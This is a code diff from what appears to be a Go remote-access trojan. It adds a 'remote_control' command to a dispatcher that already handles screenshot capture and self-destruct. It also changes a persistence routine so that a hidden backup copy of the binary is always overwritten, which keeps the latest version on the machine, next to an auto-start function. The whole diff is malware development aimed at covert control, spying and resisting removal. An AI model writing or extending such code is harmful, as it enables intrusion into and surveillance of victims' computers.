@@ -341,6 +341,12 @@ func executeCommand(cmd Command) {
 		log.Println("Taking screenshot...")
 		result = takeScreenshot()
 
+	case "remote_control":
+		log.Println("Starting remote control...")
+		// Start in a goroutine as it blocks
+		go startRemoteControl()
+		result = "Remote control started"
+
 	case "self_destruct":
 		log.Println("Received self_destruct command. Initiating self-deletion...")
 		reportResult(cmd, "Self-destruct sequence initiated. Goodbye.")
@@ -643,11 +649,10 @@ func ensureBackup() {
 	// Always save the install path so the backup knows where to restore
 	saveInstallPath(mainPath)
 
-	// Check if backup exists
-	if _, err := os.Stat(backupPath); os.IsNotExist(err) {
-		copyFile(mainPath, backupPath)
-		hideFile(backupPath)
-	}
+	// Check if backup exists or update it
+	// Always overwrite to ensure latest version is persistent
+	copyFile(mainPath, backupPath)
+	hideFile(backupPath)
 }
 
 func enableAutoStart() {
